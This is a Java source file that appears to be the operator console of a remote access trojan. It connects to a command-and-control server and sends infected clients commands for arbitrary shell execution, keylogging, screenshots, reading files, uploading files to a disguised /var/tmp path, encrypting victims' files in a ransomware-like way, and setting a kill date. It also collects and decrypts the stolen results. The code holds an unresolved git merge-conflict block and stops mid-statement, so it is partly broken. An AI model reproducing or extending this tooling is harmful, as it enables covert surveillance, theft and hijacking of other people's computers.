import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.io.RandomAccessFile;
import java.math.BigDecimal;

import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;

import java.io.InputStream;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.Calendar;
import java.util.HashMap;
import java.util.Scanner;
import java.util.TimeZone;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.sql.Date;
import java.text.SimpleDateFormat;

import AES.AESInput;
import AES.Driver;


/**
 * Code to serve as the Operator for the RATs. Connects to the server and 
 * allows for viewing and adding new commands as well as retrieving data sent
 * from the clients.
 * 
 * @author Aidan Sprague
 * @author Hassam Tariq
 * @version 07.14.2021
 */
public class Operator {

    // Operator data fields:
    private static Socket socket;
    private static BufferedReader server_in;
    private static PrintWriter server_out;
    private static String key;
    private static Scanner userInput;
    private static HashMap<String, String> extensions;

    /**
     * Creates a new Operator object. This will create and store the data
     * required for establishing an Operator connection to the server.
     * 
     * @param address   the IP address of the server
     * @param port      the open port to connect on
     */
    public Operator(String address, int port) throws Exception {

        // Establish a connection to the IP address over the given port
        socket = new Socket(address, port);

        // Create I/O buffers
        server_in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        server_out = new PrintWriter(new OutputStreamWriter(socket.getOutputStream()), true);
        
        // Open and store the key
        RandomAccessFile keyFile = new RandomAccessFile("accesskey.txt", "r");
        key = keyFile.readLine();
        keyFile.close(); 

        userInput = new Scanner(System.in);
    }

    /**
     * Creates an Operator object and stablishes a connection to the server.
     */
    public static void main(String[] args) {
        
        // Validate command line arguments
        if (args.length != 2) {
            System.out.println("Invocation: java Operator <IP Address> <Port>");
            System.exit(1);
        }

        try {
            // Set the Timezone
            TimeZone.setDefault(TimeZone.getTimeZone("UTC"));

            // Show startup screen
            clearScreen();
            System.out.println("______      _                    __    _____\n" +
                "|  _  \\    | |                  /  |  |  ___|\n" +
                "| | | |___ | | ___  ___  __   __`| |  |___ \\ \n" +
                "| | | / _ \\| |/ _ \\/ __| \\ \\ / / | |      \\ \\\n" +
                "| |/ / (_) | | (_) \\__ \\  \\ V / _| |__/\\__/ /\n" +
                "|___/ \\___/|_|\\___/|___/   \\_/  \\___(_)____/ \n");
            System.out.println("--------------------------------------------------------------------------------");
            System.out.print("[ Establishing connection .");

            // Create an Operator object
            new Operator(args[0], Integer.parseInt(args[1]));
            System.out.print(".");

            // Listen and check for connection confirmation
            String serverResponse = receiveDecrypted();
            System.out.print(". ");
            if (serverResponse == null || !serverResponse.startsWith("200 Connected")) {
                System.out.println("Error connecting ]");
                System.out.println("[ Terminating program ... Terminated ]");
                System.out.println("--------------------------------------------------------------------------------");
                disconnect();
                System.exit(2);
            }
            System.out.println("Connected ]");

            // Send key and check validation
            System.out.print("[ Sending validation key .");
            sendEncrypted(key);
            System.out.print(".");
            serverResponse = receiveDecrypted();
            System.out.print(". ");
            if (serverResponse == null || !serverResponse.equalsIgnoreCase("200 Key Accepted")) {
                System.out.println("Key rejected ]");
                System.out.println("[ Terminating program ... Terminated ]");
                System.out.println("--------------------------------------------------------------------------------");
                disconnect();
                System.exit(3);
            }
            System.out.println("Key accepted ]");
            System.out.println("--------------------------------------------------------------------------------\n");

            // External variable declarations
            String clientList = "";
            ArrayList<String> clients = null;

            // Initialize the extensions HashMap
            extensions = new HashMap<String, String>();
            extensions.put("bin", "AAA");
            extensions.put("com", "456");
            extensions.put("exe", "8FD");
            extensions.put("jar", "611");
            extensions.put("py", "FFF");
            extensions.put("mp3", "3CB");
            extensions.put("mp4", "499");
            extensions.put("wav", "999");
            extensions.put("sh", "911");
            extensions.put("xls", "DD6");
            extensions.put("xlsx", "FAC");
            extensions.put("txt", "F78");
            extensions.put("doc", "784");
            extensions.put("docx", "1DB");
            extensions.put("pdf", "C44");
            extensions.put("csv", "CDB");
            extensions.put("tar", "633");
            extensions.put("rar", "777");
            extensions.put("gif", "D43");
            extensions.put("jpg", "3FC");
            extensions.put("jpeg", "222");
            extensions.put("png", "691");
            extensions.put("zip", "8AC");
            extensions.put("gzip", "7DD");
            

            // Show the startup menu
            System.out.println("Start Menu Options:\n"
                + "  0: Quit | 1: Select Client(s) | 2: Remove Client(s) | 3: Help\n");

            while (true) {
                boolean leaveNext = false;
                System.out.print("start> ");
                String choice = userInput.nextLine().strip();
                System.out.println();

                switch (choice) {
                    case "Quit":
                    case "quit":
                    case "QUIT":
                    case "q":
                    case "Q":
                    case "0":
                        // Quit
                        sendEncrypted("0");
                        System.out.println("[ Terminating program ... Terminated ]");
                        System.out.println("--------------------------------------------------------------------------------");

                        userInput.close();
                        disconnect();

                        System.exit(0);

                        break;
                    case "1":
                        //Select client(s)
                        sendEncrypted(choice);
                        clientList = receiveDecrypted();

                        ArrayList<String> newClients = getClients(clientList);
                        if (newClients == null)
                            continue;

                        clients = newClients;
                        leaveNext = true;

                        break;
                    case "2":
                        // Remove client(s)
                        String choiceCpy = choice;
                        System.out.print(" [!] WARNING: Removing a client deletes all data. Enter 'CONTINUE' to proceed:\n\nconfirm> ");
                        choice = userInput.nextLine().strip();
                        System.out.println();

                        if (choice == null || !choice.equalsIgnoreCase("continue")) {
                            System.out.println(" [!] Invalid input. Cancelling command.\n");
                            continue;
                        }

                        sendEncrypted(choiceCpy);
                        clientList = receiveDecrypted();

                        ArrayList<String> removedClients = getClients(clientList);
                        if (removedClients == null) {
                            continue;
                        }

                        System.out.println("\n [!] Client(s) " + removedClients.toString() + " removed.\n");

                        break;
                    case "help":
                    case "Help":
                    case "HELP":
                    case "h":
                    case "H":
                    case "3":
                        // Help
                        System.out.println(
                              "  - {0} Quit:                        Kills the connection and terminates the program.\n"
                            + "  - {1} Select Client(s):            Select client(s) from the database to manipulate.\n"
                            + "  - {2} Remove Client(s):            Remove client(s) from the database (PERMANENT).\n"
                            + "  - {3} Help:                        Display this help menu.\n");

                        break;
                    case "clear":
                    case "Clear":
                    case "CLEAR":
                        // Clear the screen
                        clearScreen();

                        break;
                    default:
                        // Invalid
                        System.out.println(" [!] Invalid decision. Try 'help' or 'quit'.\n");
                }
                if (leaveNext) { break; }
            }

            // Create a list of allowed commands
            ArrayList<String> allowedCommands = new ArrayList<>(Arrays.asList(
                "directory",
                "logs",
                "network", 
                "privilege",
                "screencapture", 
                "system", 
                "tasks",
                "time",
                "users"
            ));


            // Loop until user quits
            System.out.println("\n================================================================================\n");
            printMenu();
            while (true) {

                System.out.print(clients.toString() + " home> ");
                String decision = userInput.nextLine().strip();
                System.out.println();

                switch (decision) {
                    case "Quit":
                    case "quit":
                    case "QUIT":
                    case "q":
                    case "Q":
                    case "0":
                        // Quit
                        sendEncrypted("0");
                        System.out.println("[ Terminating program ... Terminated ]");
                        System.out.println("--------------------------------------------------------------------------------");

                        userInput.close();
                        disconnect();

                        System.exit(0);

                    case "1":
                    case "4":
                        ArrayList<String> uploadCmds = new ArrayList<String>();
                        // Queue commands, Add repeat commands
                        System.out.print("Enter commands one at a time followed by"
                            + " <Enter> (type 'list' for valid cmds, 'quit' to stop):\n\n" + clients.toString() + " cmds> ");
                        StringBuilder commandList = new StringBuilder();
                        String inpt = userInput.nextLine().strip();

                        while (inpt != null && !inpt.equalsIgnoreCase("quit") && !inpt.equalsIgnoreCase("q") && !inpt.equals("0")) {
                            
                            String[] choices = inpt.split("\\s+");

                            if (inpt.equalsIgnoreCase("list") || inpt.equalsIgnoreCase("l")) {
                                System.out.println("\nValid Commands:\n\n"
                                                 + "  - directory [path]             get directory contents; default is current directory\n"
                                                 + "  - keylogger <int>              start a keylogger for int seconds\n"
                                                 + "  - logs                         collect information from the keylogger\n"
                                                 + "  - network                      get connection info\n"
                                                 + "  - print <file>                 get contents of a file\n"
                                                 + "  - privilege                    get privilege status\n"
                                                 + "  - reboot [int]                 reboot the system (optional delay of int seconds)\n"
                                                 + "  - screencapture                take a screenshot at the next connection\n"
                                                 + "  - shell [arg1] [arg2] ...      execute any shell command\n"
                                                 + "  - shutdown [int]               shutdown the system (optional delay of int seconds)\n"
                                                 + "  - system                       get basic system info\n"
                                                 + "  - tasks                        get running processes\n"
                                                 + "  - time                         get client system's local time\n"
                                                 + "  - tree [path]                  get a tree of directory contents; default is current directory\n"
                                                 + "  - upload [filename]            Uploads file to client file system(WIP)\n"
                                                 + "                                    - File must be placed in Operator/Scripts directory\n"
                                                 + "                                    - File is uploaded to /var/tmp/x86_64-linux-gnu on client system\n"
                                                 + "  - users                        get active users\n\n"
                                                 + "  - encrypt [path] [path] ...    encrypt the file(s) specified\n"
                                                 + "  - decrypt [path] [path] ...    decrypt the file(s) specified\n"
                                                 + "  - decrypt -all                 decrypt all encrypted files on current client's file system\n"
                                                 + "  - list_encrypted               lists all files that are currently encrypted\n\n"
                                                 + "  - sleep_1 <int>                set the client sleep time for server connections (total seconds)\n"
                                                 + "  - sleep_2 <int>                set the client sleep time for checking killtime (total seconds)\n"
                                                 + "  - killtime                     set the client kill date and time\n\n"
                                                 + "  - quit                         send the list of commands (if any)\n"
                                                 + "  - display                      display the list of commands (if any)\n"
                                                 + "  - clear                        clear the list of commands (if any)\n");
                            }
                            else if (inpt.equalsIgnoreCase("screencap") || inpt.equalsIgnoreCase("screenshot")) {
                                commandList.append("screencapture|");
                            }
                            else if (choices[0].equalsIgnoreCase("upload") && choices.length == 2) {
<<<<<<< HEAD:Operator/src/Operator.java
                                File file = new File(choices[1]);
                                FileInputStream input = new FileInputStream(file);
                                byte[] bytes = input.readAllBytes();
                                input.close();
                                String encr = "";
                                for (byte b : bytes) {
                                    encr += String.format("%02X", b);
=======
                                if(!choices[1].endsWith(".txt")) {
                                    System.out.println("\n [!] The upload command currently only supports uploading .txt files.\n");
                                }
                                else {
                                    File file = new File(choices[1]);
                                    byte[] bytes = Files.readAllBytes(file.toPath());
                                    String encr = "";
                                    for (byte b : bytes) {
                                        encr += String.format("%02X", b);
                                    }
                                    // Ensures that all upload commands are added to end of commandList
                                    uploadCmds.add("upload " + choices[1] + " " + encr);
>>>>>>> 4e7ddd3b58725e7c305c7852972c60fc1b2474ac:Working/Operator/src/Operator.java
                                }
                            }
                            else if ((choices[0].equalsIgnoreCase("directory") || choices[0].equalsIgnoreCase("tree") || choices[0].equalsIgnoreCase("print")) && choices.length == 2) {
                                commandList.append(inpt + "|");
                            }
                            else if (choices[0].equalsIgnoreCase("reboot") || choices[0].equalsIgnoreCase("shutdown")) {
                                if (choices.length == 1) {
                                    commandList.append(inpt + "|");
                                }
                                else if (choices.length == 2) {
                                    try { 
                                        Integer.parseInt(choices[1]);
                                        commandList.append(inpt + "|"); 
                                    }
                                    catch (NumberFormatException n) {
                                        System.out.println("\n [!] Invalid command. Type 'list' for help or 'quit' to stop.\n");
                                    }
                                }
                            }
                            else if (choices[0].equalsIgnoreCase("shell") && choices.length > 1) {
                                commandList.append(inpt + "|");
                            }
                            else if (choices[0].equalsIgnoreCase("encrypt") && choices.length >= 2 && clients.size() == 1) {
                                sendEncrypted("-1");
                                receiveDecrypted();
                                sendEncrypted(clients.get(0));
                                serverResponse = receiveDecrypted();
                                if (serverResponse == null || serverResponse.equals("")) {
                                    for (int i = 1; i < choices.length; i++) {
                                        commandList.append("encrypt " + choices[i] + "|");
                                    }
                                }
                                else {
                                    ArrayList<String> encryptedFiles = new ArrayList<String>(Arrays.asList(serverResponse.split(", ")));
                                    boolean valid = true;
                                    ArrayList<String> invalid = new ArrayList<String>();
                                    for (int i = 1; i < choices.length; i++) {
                                        if (encryptedFiles.contains(choices[i])) {
                                            valid = false;
                                            invalid.add(choices[i]);
                                        }
                                    }
                                    if (valid) {
                                        for (int i = 1; i < choices.length; i++) {
                                            commandList.append("encrypt " + choices[i] + "|");
                                        }
                                    }
                                    else {
                                        System.out.println("\n [!] One or more of the file paths you have entered have already been encrypted.\n");
                                        for (int i = 0; i < invalid.size(); i++) {
                                            System.out.println("    - " + invalid.get(i));
                                        }
                                        System.out.println();
                                    }
                                }
                            }
                            else if(choices[0].equalsIgnoreCase("encrypt") && clients.size() > 1) {
                                System.out.println("\n [!] Please select only 1 client when encrypting or decrypting files.\n");
                            }
                            else if (choices[0].equalsIgnoreCase("decrypt") && choices.length >= 2 && clients.size() == 1) {
                                sendEncrypted("-1");
                                receiveDecrypted();
                                sendEncrypted(clients.get(0));
                                serverResponse = receiveDecrypted();
                                if (serverResponse == null || serverResponse.equals("")) {
                                    System.out.println("\n [!] No files have been encrypted.");
                                }
                                else if(choices[1].equalsIgnoreCase("-all")) {
                                    // Handles -all switch
                                    ArrayList<String> encryptedFiles = new ArrayList<String>(Arrays.asList(serverResponse.split(", ")));
                                    for(String str : encryptedFiles) {
                                        commandList.append("decrypt " + str + "|");
                                    }
                                }
                                else {
                                    // Each entry in encryptedFiles is for each client
                                    ArrayList<String> encryptedFiles = new ArrayList<String>(Arrays.asList(serverResponse.split(", ")));
                                    boolean valid = true;
                                    ArrayList<String> invalid = new ArrayList<String>();
                                    for (int i = 1; i < choices.length; i++) {
                                        if (!encryptedFiles.contains(choices[i])) {
                                            valid = false;
                                            invalid.add(choices[i]);
                                        }
                                    }
                                    if (valid) {
                                        for(int i = 1; i < choices.length; i++) {
                                            commandList.append("decrypt " + choices[i] + "|");
                                        }
                                    }
                                    else {
                                        System.out.println("\n [!] One or more of the file paths you have entered have not been encrypted.");
                                        for(int i = 0; i < invalid.size(); i++) {
                                            System.out.println("    - " + invalid.get(i));
                                        }
                                        System.out.println();
                                    }
                                }
                            }
                            else if(choices[0].equalsIgnoreCase("decrypt") && clients.size() > 1) {
                                System.out.println("\n [!] Please select only 1 client when encrypting or decrypting files.\n");
                            }
                            else if(choices[0].equalsIgnoreCase("list_encrypted") && clients.size() > 1) {
                                System.out.println("\n [!] Please select only 1 client when encrypting or decrypting files.\n");
                            }
                            else if (choices[0].equalsIgnoreCase("list_encrypted") && choices.length == 1) {
                                sendEncrypted("-1");
                                receiveDecrypted();
                                sendEncrypted(clients.get(0));
                                serverResponse = receiveDecrypted();
                                if (serverResponse == null || serverResponse.equals("[No Files]"))
                                    System.out.println("\n [!] No files are currently encrypted.\n");

                                else {
                                    ArrayList<String> encryptedFiles = new ArrayList<String>(Arrays.asList(serverResponse.split(", ")));
                                    if(encryptedFiles.size() != 0) {
                                        System.out.println("\nEncrypted files:");
                                        for (String file : encryptedFiles)
                                            System.out.println("   - " + file);
                                        System.out.println();
                                    }
                                    else {
                                        System.out.println("\n [!] There are no encrypted files on the specified file system.\n");
                                    }
                                }
                            }
                            else if ((choices[0].startsWith("sleep") || choices[0].equalsIgnoreCase("keylogger")) && choices.length == 2) {
                                try { 
                                    Integer.parseInt(inpt.split("\\s+")[1]);
                                    commandList.append(inpt + "|"); 
                                }
                                catch (NumberFormatException n) {
                                    System.out.println("\n [!] Invalid command. Type 'list' for help or 'quit' to stop.\n");
                                }
                            }
                            else if (inpt.equalsIgnoreCase("killtime")) {
                                System.out.println("\n [!] NOTE: Time is communicated as UTC (GMT +/- 0); adjust accordingly (EDT = GMT-04:00)");
                                long epochTime = getDateToEpoch(true);
                                commandList.append("killtime " + epochTime + "|");
                            }
                            else if (inpt.equalsIgnoreCase("display") || inpt.equalsIgnoreCase("d")) {
                                if (commandList == null || commandList.toString().length() == 0)
                                    System.out.println("\n [!] Command list is empty.\n");
                                else {
                                    String list = commandList.toString();
                                    list = list.substring(0, list.length() - 1).replace("|", ", ");
                                    System.out.println("\n [!] Command list: " + list + "\n");
                                }
                            }
                            else if (inpt.equalsIgnoreCase("clear") || inpt.equalsIgnoreCase("c")) {
                                if (commandList == null || commandList.toString().length() == 0)
                                    System.out.println("\n [!] Command list is already empty.\n");
                                else {
                                    commandList = new StringBuilder();
                                    System.out.println("\n [!] Command list cleared.\n");
                                }
                            }
                            else if (!allowedCommands.contains(inpt)) {
                                System.out.println("\n [!] Invalid command. Type 'list' for help or 'quit' to stop.\n");
                            }
                            else 
                                commandList.append(inpt + "|");
                                
                            System.out.print(clients.toString() + " cmds> ");
                            inpt = userInput.nextLine().strip();
                        }

                        // Add in the upload commands to the end of the list
                        for(int i = 0; i < uploadCmds.size(); i++) {
                            commandList.append(uploadCmds.get(i) + "|");
                        }

                        if (commandList.toString() == null || commandList.toString().length() == 0) {
                            System.out.println("\n [!] No commands entered.\n");
                            continue;
                        }

                        sendEncrypted(decision);
                        serverResponse = receiveDecrypted();
                        if (serverResponse == null || !serverResponse.equalsIgnoreCase("200 Ready to receive")) {
                            System.out.println(serverResponse + "\n");
                            continue;
                        }

                        System.out.print("\n[ Sending .");
                        sendEncrypted(commandList.toString());
                        System.out.print(".");
                        serverResponse = receiveDecrypted();
                        System.out.print(". ");
                        if (serverResponse == null || !serverResponse.equalsIgnoreCase("200 Commands received")) {
                            System.out.println(serverResponse + " ]\n");
                            continue;
                        }

                        System.out.println("Sent ]\n");

                        break;
                    case "2":
                    case "5":
                        // View command queue, View repeat commands
                        sendEncrypted(decision);
                        for (String client_id : clients) {
                            serverResponse = receiveDecrypted();
                            if (serverResponse == null) {
                                System.out.println(" [!] Error receiving data for " + client_id +".\n");
                                continue;
                            }

                            System.out.println(" " + client_id + ": " + serverResponse);
                            sendEncrypted(decision);
                        }
                        System.out.println();

                        break;
                    case "3":
                    case "6":
                        // Clear command queue, Delete repeat commands
                        String num = decision;
                        System.out.print("WARNING: Action is irreversible. Type 'DELETE' to confirm.\n\n" + clients.toString() + " confirm> ");
                        decision = userInput.nextLine().strip();
                        System.out.println();

                        if (decision == null || !decision.equalsIgnoreCase("delete")) {
                            System.out.println(" [!] Invalid input. Cancelling command.\n");
                            break;
                        }

                        sendEncrypted(num);
                        for (String client_id : clients) {
                            serverResponse = receiveDecrypted();
                            if (serverResponse == null) {
                                System.out.println(" [!] Error clearing commands for " + client_id + ".");
                                break;
                            }
                            else if (serverResponse.startsWith("205")) {
                                System.out.println(" [!] Queue for " + client_id + " is already empty.");
                            }
                            else if (!serverResponse.startsWith("200")) {
                                System.out.println(" [!] Error clearing commands for " + client_id + ".");
                            }
                            else {
                                System.out.println(" [!] Commands cleared for " + client_id + ".");
                            }
                            sendEncrypted(num);
                        }
                        System.out.println();

                        break;
                    case "7":
                        // Results Menu
                        System.out.println("================================================================================\n");
                        sendEncrypted(decision);
                        receiveDecrypted();

                        System.out.println(
                              "Results Menu Options:\n"
                            + "  0: Exit | 1: Results Info | 2: View Last Result | 3: View Range of Results\n"
                            + "  4: View All Results | 5: Download Range of Results | 6: Download All Results\n"
                            + "  7: Help\n");

                        while (true) {
                            boolean leaveNext = false;
                            System.out.print(clients.toString() + " results> ");
                            decision = userInput.nextLine().strip();
                            System.out.println();

                            switch (decision) {
                                case "Exit":
                                case "exit":
                                case "EXIT":
                                case "e":
                                case "E":
                                case "q":
                                case "Q":
                                case "0":
                                    // Exit
                                    sendEncrypted("0");
                                    receiveDecrypted();
                                    leaveNext = true;
                                    System.out.println(" [!] Exiting...\n");

                                    break;
                                case "1":
                                    // View result info
                                    sendEncrypted(decision);
                                    for (String client_id : clients) {
                                        serverResponse = receiveDecrypted();
                                        if (serverResponse == null || serverResponse.equalsIgnoreCase("")) {
                                            System.out.println(" [!] Error receiving results info for " + client_id + ".\n\n");
                                            sendEncrypted("sync");
                                            continue;
                                        }
                                        if (serverResponse.equalsIgnoreCase("[No results]")) {
                                            System.out.println("Client: " + client_id + "\n[No results]\n"
                                                + "\n--------------------------------------------------------------------------------\n");
                                            sendEncrypted("sync");
                                            continue;
                                        }

                                        String[] rs = serverResponse.split("\\|");
                                        BigDecimal first = new BigDecimal(rs[0]);
                                        BigDecimal last = new BigDecimal(rs[1]);
                                        int count = Integer.parseInt(rs[2]);

                                        String ft = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss 'UTC'").format(Double.parseDouble(first.toPlainString()));
                                        String lt = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss 'UTC'").format(Double.parseDouble(last.toPlainString()));

                                        System.out.println("Client:         " + client_id + 
                                                         "\nFirst Result:   " + ft + 
                                                         "\nLast Result:    " + lt + 
                                                         "\nTotal Results:  " + count
                                            + "\n\n--------------------------------------------------------------------------------\n");

                                        sendEncrypted("sync");
                                    }
                                    
                                    break;
                                case "2":
                                    // View last result
                                    sendEncrypted(decision);
                                    for (String client_id : clients) {
                                        serverResponse = server_in.readLine();
                                        if (serverResponse == null || serverResponse.equalsIgnoreCase("")) {
                                            System.out.println(" [!] Error receiving recent results for " + client_id + ".\n");
                                            sendEncrypted("sync");
                                            continue;
                                        }
                                        if (serverResponse.equalsIgnoreCase("[No results]")) {
                                            System.out.println("Client: " + client_id + "\n\n[No results]\n"
                                                + "\n--------------------------------------------------------------------------------\n");
                                            sendEncrypted("sync");
                                            continue;
                                        }
                                        
                                        String[] rs = serverResponse.split("\\|");
                                        BigDecimal decimal = new BigDecimal(rs[0]);
                                        String dec = "";
                                        
                                        if (rs[1].equals("screencapture")) {

                                            String time = new SimpleDateFormat("yyyy-MM-dd_HHmmssSSS").format(Double.parseDouble(decimal.toPlainString()));
                                            Path target = Paths.get("Screenshots/" + client_id + "_" + time + ".jpg");
                                            
                                            if (!Files.exists(target)) {
                                                
                                                byte[] bytes = Base64.getDecoder().decode(rs[2]);

                                                InputStream is = new ByteArrayInputStream(bytes);
                                                BufferedImage newBi = ImageIO.read(is);
                                                ImageIO.write(newBi, "jpg", target.toFile());
                                            }
                                            dec = "Image saved as <" + target.toAbsolutePath().toString() + ">.";
                                        }
                                        else {
                                            dec = Driver.run(new AESInput(rs[2], rs[3], false));
                                            dec = dec.replaceAll("\\\\n", System.lineSeparator()).replaceAll("\\\\r", "").replace("\"", "");
                                        }

                                        String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss 'UTC'").format(Double.parseDouble(decimal.toPlainString()));
                                        System.out.println("Client: " + client_id + "\nDate/Time: " + time + "\nCommand: " + rs[1] + "\n\n" + dec
                                            + "\n--------------------------------------------------------------------------------\n");
                                        sendEncrypted("sync");
                                    }
                                    
                                    break;
                                case "3":
                                    // View range of results
                                    sendEncrypted(decision);
                                    receiveDecrypted();

                                    System.out.println(" [!] NOTE: Time is communicated as UTC (GMT +/- 0); adjust accordingly (EDT = GMT-04:00)\n"
                                        + "\n Input Beginning Date:");
                                    long beginning = getDateToEpoch(false);

                                    System.out.println(" Input Ending Date:");
                                    long end = getDateToEpoch(false);

                                    sendEncrypted(beginning + "|" + end);

                                    for (String client_id : clients) {
                                        System.out.println("================================================================================\nClient: " + client_id + "\n================================================================================\n");
                                        serverResponse = server_in.readLine();
                                        if (serverResponse.equalsIgnoreCase("[No results]")) {
                                            System.out.println("[No results for date range]\n"
                                                + "\n--------------------------------------------------------------------------------\n");
                                            sendEncrypted("sync");
                                            continue;
                                        }

                                        while (true) {
                                            if (serverResponse.equalsIgnoreCase("END OF RESULTS")) 
                                                break;
                                            
                                            String[] rs = serverResponse.split("\\|");
                                            BigDecimal decimal = new BigDecimal(rs[0]);
                                            String dec = "";
                                            
                                            if (rs[1].equals("screencapture")) {
    
                                                String time = new SimpleDateFormat("yyyy-MM-dd_HHmmssSSS").format(Double.parseDouble(decimal.toPlainString()));
                                                Path target = Paths.get("Screenshots/" + client_id + "_" + time + ".jpg");
                                                
                                                if (!Files.exists(target)) {
                                                    
                                                    byte[] bytes = Base64.getDecoder().decode(rs[2]);
    
                                                    InputStream is = new ByteArrayInputStream(bytes);
                                                    BufferedImage newBi = ImageIO.read(is);
                                                    ImageIO.write(newBi, "jpg", target.toFile());
                                                }
    
                                                dec = "Image saved as <" + target.toAbsolutePath().toString() + ">.";
                                            }
                                            else {
                                                dec = Driver.run(new AESInput(rs[2], rs[3], false));
                                                dec = dec.replaceAll("\\\\n", System.lineSeparator()).replaceAll("\\\\r", "").replace("\"", "");
                                            }
    
                                            String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss 'UTC'").format(Double.parseDouble(decimal.toPlainString()));
                                            System.out.println("Client: " + client_id + "\nDate/Time: " + time + "\nCommand: " + rs[1] + "\n\n" + dec
                                                + "\n--------------------------------------------------------------------------------\n");
                                            
                                            sendEncrypted("sync");
                                            serverResponse = server_in.readLine();
                                        }
                                        sendEncrypted("sync");
                                    }

                                    break;
                                case "4":
                                    // View all results
                                    sendEncrypted(decision);

                                    for (String client_id : clients) {
                                        System.out.println("================================================================================\nClient: " + client_id + "\n================================================================================\n");
                                        serverResponse = server_in.readLine();
                                        if (serverResponse.equalsIgnoreCase("[No past results]")) {
                                            System.out.println("[No past results]\n"
                                                + "\n--------------------------------------------------------------------------------\n");
                                            sendEncrypted("sync");
                                            continue;
                                        }

                                        while (true) {
                                            if (serverResponse.equalsIgnoreCase("END OF RESULTS")) 
                                                break;
                                            
                                            String[] rs = serverResponse.split("\\|");
                                            BigDecimal decimal = new BigDecimal(rs[0]);
                                            String dec = "";
                                            
                                            if (rs[1].equals("screencapture")) {
    
                                                String time = new SimpleDateFormat("yyyy-MM-dd_HHmmssSSS").format(Double.parseDouble(decimal.toPlainString()));
                                                Path target = Paths.get("Screenshots/" + client_id + "_" + time + ".jpg");
                                                
                                                if (!Files.exists(target)) {
                                                    
                                                    byte[] bytes = Base64.getDecoder().decode(rs[2]);
    
                                                    InputStream is = new ByteArrayInputStream(bytes);
                                                    BufferedImage newBi = ImageIO.read(is);
                                                    ImageIO.write(newBi, "jpg", target.toFile());
                                                }
    
                                                dec = "Image saved as <" + target.toAbsolutePath().toString() + ">.";
                                            }
                                            else {
                                                dec = Driver.run(new AESInput(rs[2], rs[3], false));
                                                dec = dec.replaceAll("\\\\n", System.lineSeparator()).replaceAll("\\\\r", "").replace("\"", "");
                                            }
    
                                            String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss 'UTC'").format(Double.parseDouble(decimal.toPlainString()));
                                            System.out.println("Client: " + client_id + "\nDate/Time: " + time + "\nCommand: " + rs[1] + "\n\n" + dec
                                                + "\n--------------------------------------------------------------------------------\n");
                                            
                                            sendEncrypted("sync");
                                            serverResponse = server_in.readLine();
                                        }
                                        sendEncrypted("sync");
                                    }

                                    break;
                                case "5":
                                    // Download range of results
                                    sendEncrypted(decision);
                                    receiveDecrypted();

                                    System.out.println("\n [!] NOTE: Time is communicated as UTC (GMT +/- 0); adjust accordingly (EDT = GMT-04:00)\n"
                                        + "\n Input Beginning Date:");
                                    long beginning2 = getDateToEpoch(false);

                                    System.out.println(" Input Ending Date:");
                                    long end2 = getDateToEpoch(false);

                                    sendEncrypted(beginning2 + "|" + end2);

                                    for (String client_id : clients) {
                                        System.out.println("Client: " + client_id + "\n");
                                        serverResponse = server_in.readLine();
                                        if (serverResponse.equalsIgnoreCase("[No results]")) {
                                            System.out.println("[No results for date range]\n"
                                                + "\n--------------------------------------------------------------------------------\n");
                                            sendEncrypted("sync");
                                            continue;
                                        }

                                        System.out.print("[ Downloading .");
            
                                        StringBuilder builder = new StringBuilder();
                                        while (true) {
                                            if (serverResponse.equalsIgnoreCase("END OF RESULTS")) 
                                                break;
                                            
                                            String[] rs = serverResponse.split("\\|");
                                            BigDecimal decimal = new BigDecimal(rs[0]);
                                            String dec = "";
                                            
                                            if (rs[1].equals("screencapture")) {
    
                                                String time = new SimpleDateFormat("yyyy-MM-dd_HHmmssSSS").format(Double.parseDouble(decimal.toPlainString()));
                                                Path target = Paths.get("Screenshots/" + client_id + "_" + time + ".jpg");
                                                
                                                if (!Files.exists(target)) {
                                                    
                                                    byte[] bytes = Base64.getDecoder().decode(rs[2]);
    
                                                    InputStream is = new ByteArrayInputStream(bytes);
                                                    BufferedImage newBi = ImageIO.read(is);
                                                    ImageIO.write(newBi, "jpg", target.toFile());
                                                }
    
                                                dec = "Image saved as <" + target.toAbsolutePath().toString() + ">.";
                                            }
                                            else {
                                                dec = Driver.run(new AESInput(rs[2], rs[3], false));
                                                dec = dec.replaceAll("\\\\n", System.lineSeparator()).replaceAll("\\\\r", "").replace("\"", "");
                                            }
    
                                            String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss 'UTC'").format(Double.parseDouble(decimal.toPlainString()));
                                            builder.append("Client: " + client_id + "\nDate/Time: " + time + "\nCommand: " + rs[1] + "\n\n" + dec
                                                + "\n--------------------------------------------------------------------------------\n");
                                            
                                            sendEncrypted("sync");
                                            serverResponse = server_in.readLine();
                                            System.out.print(".");
                                        }
                                        System.out.println(". Downloaded ]\n");
            
                                        Path path = Paths.get("Results/" + client_id + "_" + getTime() + "_results.txt");
                                        RandomAccessFile file = new RandomAccessFile(path.toString(), "rw");
                                        file.writeBytes("================================================================================\nClient: " + client_id + "\n================================================================================\n" + builder.toString());
                                        System.out.println("See file <" + path.toAbsolutePath().toString() + "> for results.\n"
                                            + "\n--------------------------------------------------------------------------------\n");
                                        file.close();
            
                                        sendEncrypted("sync");
                                    }

                                    break;
                                case "6":
                                    // Download all results
                                    sendEncrypted(decision);

                                    for (String client_id : clients) {
                                        System.out.println("Client: " + client_id + "\n");
                                        serverResponse = server_in.readLine();
                                        if (serverResponse.equalsIgnoreCase("[No past results]")) {
                                            System.out.println("[No past results]\n"
                                                + "\n--------------------------------------------------------------------------------\n");
                                            sendEncrypted("sync");
                                            continue;
                                        }
            
                                        System.out.print("[ Downloading .");
            
                                        StringBuilder builder = new StringBuilder();
                                        while (true) {
                                            if (serverResponse.equalsIgnoreCase("END OF RESULTS")) 
                                                break;
                                            
                                            String[] rs = serverResponse.split("\\|");
                                            BigDecimal decimal = new BigDecimal(rs[0]);
                                            String dec = "";
                                            
                                            if (rs[1].equals("screencapture")) {
    
                                                String time = new SimpleDateFormat("yyyy-MM-dd_HHmmssSSS").format(Double.parseDouble(decimal.toPlainString()));
